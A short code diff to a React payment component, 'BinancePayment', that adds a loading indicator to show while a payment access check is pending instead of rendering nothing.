@@ -3,6 +3,7 @@ import { X, Copy, Check } from "lucide-react";
 import { useNavigate, useSearchParams } from "@/lib/flowRouter";
 import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
+import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
 import { sendTelegramNotification } from "@/lib/payment-telegram";
 import orderExample from "@/assets/payment/binance-order-example.jpg";
@@ -89,7 +90,7 @@ const BinancePayment = () => {
     }, 5000);
   };
 
-  if (isAllowed !== true) return null;
+  if (isAllowed !== true) return <FlowLoading />;
 
   return (
     <div className="fixed inset-0 bg-white md:bg-black/40 flex items-start md:items-center justify-center p-0 md:p-4 overflow-auto">
